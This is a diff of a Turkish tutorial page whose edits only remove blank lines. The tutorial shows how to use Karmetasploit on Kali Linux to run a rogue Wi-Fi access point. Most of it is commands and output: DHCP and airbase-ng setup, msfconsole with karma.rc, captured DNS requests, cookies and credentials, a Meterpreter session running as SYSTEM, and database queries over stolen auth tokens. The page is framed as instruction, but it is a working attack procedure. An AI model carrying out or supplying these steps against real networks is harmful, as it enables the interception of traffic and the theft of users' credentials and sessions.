@@ -16,27 +16,15 @@ tags:
     - cybersecurity
     - 'metasploit framework'
 ---
-
-
 Bu yazıda, Metasploit içinde Karmetasploit hakkında bilgi vermeye çalışacağız. Genel olarak kurulum, ayarlarının yapılması ve örnek kullanımı göreceğiz.
-
-
 
 ## Karmetasploit Nedir?
 
-
-
 Karmetasploit, access point noktaları oluşturma, parola yakalama, bilgi toplama ve web tarayıcı saldırıları gerçekleştirilmek için kullanılan bir programdır. Kısaca, sahte bir modem veya access point oluşturursunuz. Bir takım kullanıcılar bu noktaya bağlanır. Siz de Karmetasploit sayesinde trafiği dinleyebilirsiniz.
-
-
 
 ## Karmetasploit Ayarlama
 
-
-
 Şimdi, Kali Linux içinde Karmetasploit’in kullanıma hazır hale getirilmesini görelim. İlk adımımız kontrol dosyasının indirme ile başlıyor.
-
-
 ```bash
 root@kali:~# wget <a href="https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt">https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt</a>
 --2015-04-03 16:17:27-- <a href="https://www.offensive-security.com/downloads/karma.rc">https://www.offensive-security.com/downloads/karma.rc</a>
@@ -51,15 +39,9 @@ Saving to: `karma.rc' 100%[======================================>] 1,089 --.-K/
 root@kali:~#
 ```
 
-
-
 Oluşturacağımız Access Point’e kullanıcılar bağlandığında ne olması gerekir? Tabii ki bağlanan kullanıcıya bir IP adresi atanması beklenir. Bu durumda, Kali Linux işletim sistemini DHCP Sunucu olarak ayarlamalıyız.
 
-
-
 Şimdi Kali Linux içine `isc-dhcp-server` kuralım.
-
-
 ```bash
 root@kali:~# apt update
 ...snip...
@@ -71,11 +53,7 @@ Reading state information... Done
 root@kali:~#
 ```
 
-
-
 Kurulum tamamlandıktan sonra `dhcpd.conf` dosyasında gerekli ayarları yapalım. `dhscpd.conf` dosyasının bir yedeğini aldıktan sonra aşağıdaki örneğe benzer hale getirmelisiniz.
-
-
 ```bash
 root@kali:~# cat /etc/dhcp/dhcpd.conf
 option domain-name-servers 10.0.0.1;
@@ -97,15 +75,9 @@ subnet 10.0.0.0 netmask 255.255.255.0 {
 root@kali:~#
 ```
 
-
-
 Şimdi de bir kaç gerekliliği kuralım.
 
-
-
 ## libsqlite3-dev Paketini Kuralım
-
-
 ```bash
 root@kali:~# apt -y install libsqlite3-dev
 Reading package lists... Done
@@ -114,11 +86,7 @@ Reading state information... Done
 ...snip...
 ```
 
-
-
 ## activerecord sqlite3 Ruby Modülleri Kuralım
-
-
 ```bash
 root@kali:~# gem install activerecord sqlite3
 Fetching: activerecord-5.0.0.1.gem (100%)
@@ -136,37 +104,21 @@ Done installing documentation for **sqlite3 after 0 seconds
 root@kali:~#
 ```
 
-
-
 Artık Karmetsploit kullanmaya hazırız. Yapacağımız işlemler sırasıyla şöyle;
-
-
 *  Wireless kartı tespit edelim.
 
 * wireless kartı monitor mod ile başlatalım.
 
 * Yeni bir Kablosuz ağ başlatalım.
-
-
-
-
 ## Wireless Arayüz Adını Tespit Edelim
-
-
 ```bash
 root@kali:~# airmon-ng
-
-
 PHY     Interface       Driver          Chipset
 
 phy0	wlan0	        ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
 ```
 
-
-
 ## airmon-ng Başlatalım
-
-
 ```bash
 root@kali:~# airmon-ng start wlan0
 
@@ -186,11 +138,7 @@ PID     Name
 934     wpa_supplicant
 ```
 
-
-
 ## Monitor Mod ile airbase-ng Başlatalım
-
-
 ```bash
 root@kali:~# airbase-ng -P -C 30 -e "U R PWND" -v wlan0mon
 For information, no action required: Using gettimeofday**()** instead of /dev/rtc
@@ -200,21 +148,13 @@ For information, no action required: Using gettimeofday**()** instead of /dev/rt
 22:52:25  Access Point with BSSID 00:C0:CA:82:D9:63 started.
 ```
 
-
-
 Yukarıdaki çıktıda görüldüğü gibi `at0` isminde yeni bir wireless arayüz başlatıldı. Şimdi, kendi bilgisayarımızı bu ağa dahil edelim.
-
-
 ```bash
 root@kali:~# ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
 root@kali:~#
 ```
 
-
-
 DHCP Sunucuyu başlatmak üzereyiz. Sunucu başladığında toplanan bilgilerin kayıt edileceği bir veri tabanı ihtiyacımız olacak. Bunun için önce bir veri tabanı oluşturalım ve DHCP sunuyu başlatalım.
-
-
 ```bash
 root@kali:~# touch /var/lib/dhcp/dhcpd.leases
 root@kali:~# dhcpd -cf /etc/dhcp/dhcpd.conf at0
@@ -235,11 +175,7 @@ root      2373  0.0  0.4  28448  9532 ?        Ss   13:45   0:00 dhcpd -cf /etc/
 root@kali:~#
 ```
 
-
-
 `msfconsole` programını harici kaynak olarak, ilk başta indirdiğimiz `karma.rc_.txt` dosyasını göstererek başlatalım.
-
-
 ```bash
 root@kali:~# msfconsole -q -r karma.rc_.txt
 
@@ -282,20 +218,12 @@ resource (karma.rc_.txt**)>** run
 > Listening on 0.0.0.0:110...
 > Auxiliary module execution completed
 > Server started.
-
-
 msf auxiliary(http) >
 ```
 
-
-
 Artık oluşturduğumuz Acces Point üzerinden dinleme yapıyoruz. Bir kullanıcı kablosuz bağlantı ile bu noktaya bağlanır ve web üzerinden işlemler yapmaya başladıında tüm trafik veri tabanımıza kayıt edilmektedir.
 
-
-
 Kayıt edilen paketlere bakalım.
-
-
 ```bash
 msf auxiliary(http) >
 > DNS 10.0.0.100:1276 XID 87 (IN::A <a href="http://www.msn.com/">www.msn.com</a>)
@@ -400,11 +328,7 @@ Active sessions
   1   Meterpreter  10.0.0.1:45017 -> 10.0.0.100:1364
 ```
 
-
-
 Yukarıdaki çıktılardan, kullanıcının bir çok adrese bağlandığını ve işlemler yaptığını görebiliriz. Bu çıktıları parça parça inceleyelim.
-
-
 ```bash
 > DNS 10.0.0.100:1284 XID 92 (IN::A <a href="http://ecademy.com/">ecademy.com</a>)
 > DNS 10.0.0.100:1286 XID 93 (IN::A <a href="http://facebook.com/">facebook.com</a>)
@@ -413,11 +337,7 @@ Yukarıdaki çıktılardan, kullanıcının bir çok adrese bağlandığını ve
 > DNS 10.0.0.100:1287 XID 94 (IN::A <a href="http://gather.com/">gather.com</a>)
 ```
 
-
-
 Bu kısımda, kullanıcının bağlanmak istediği adreslere dair DNS Lookup işlemi yapılmaktadır.
-
-
 ```bash
 > HTTP REQUEST 10.0.0.100 > <a href="http://gmail.google.com/">gmail.google.com</a>:80 GET /forms.html Windows IE 5.01 cook
 ies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880: S=snePRUjY-zgcXpEV;NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6h I1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
@@ -463,15 +383,9 @@ Here we can see Karmetasploit collecting cookie information from the client. Thi
 > Meterpreter session 1 opened (10.0.0.1:45017 -> 10.0.0.100:1364)
 ```
 
-
-
 Bu kısımda, kullanıcının parola bilgilerinin, cookie bilgilerinin toplandığı görülmektedir. Bu işlemlerin ardından, hedef bilgisayarda oturum açılmaya çalışılmaktadır.
 
-
-
 Açılan Meterpreter oturumunda neler yapılabileceğine bakalım.
-
-
 ```bash
 msf auxiliary(http) > sessions -i 1
 > Starting interaction with 1...
@@ -514,36 +428,24 @@ Hardware MAC: 00:0c:29:85:81:55
 IP Address  : 0.0.0.0
 Netmask     : 0.0.0.0
 
-
-
 Realtek RTL8187 Wireless LAN USB NIC                                    
 Hardware MAC: 00:c0:ca:1a:e7:d4
 IP Address  : 10.0.0.100
 Netmask     : 255.255.255.0
 
-
-
 MS TCP Loopback interface
 Hardware MAC: 00:00:00:00:00:00
 IP Address  : 127.0.0.1
 Netmask     : 255.0.0.0
-
-
 meterpreter > pwd
 C:\WINNT\system32
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-
-
 Gördüğünüz gibi, açılan oturumda neler yapılabileceğini örnek olarak gösterdik. Ayrıca bilgi toplama devam ettikçe inanılmaz çok bilgi kayıt edilecektir. Bunların kullanımı için veri tabanına bakmak ihtiyacı hissedebilirsiniz. Şimdi veri tabanı ile etkileşim sağlayalım.
 
-
-
 Veri tabanı Ev klasöründe oluşturulmuştu. Aşağıdaki komut ile veri tabanına bağlanalım.
-
-
 ```bash
 root@kali:~# sqlite3 karma.db
 SQLite version 3.5.9
@@ -631,11 +533,7 @@ CREATE TABLE vulns_refs (
 );
 ```
 
-
-
 Veri tabanı şemasından faydalanarak bilgileri kontrol edelim.
-
-
 ```bash
 sqlite> **select** ***** from hosts;
 1|2009-05-09 23:47:04|10.0.0.100|||alive||Windows|2000|||x86
@@ -665,7 +563,5 @@ sqlite> **select** ***** from notes where host_id = 1;
 109|2009-05-10 00:43:29|1|http_cookies|www.twitter.com auth_token=1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
 sqlite>
 ```
-
-
 
 Buradan ötesi, sizin veri tabanı bilginize ve kayıt edilen bilgilerin raporlanmasına kalmış durumdadır.
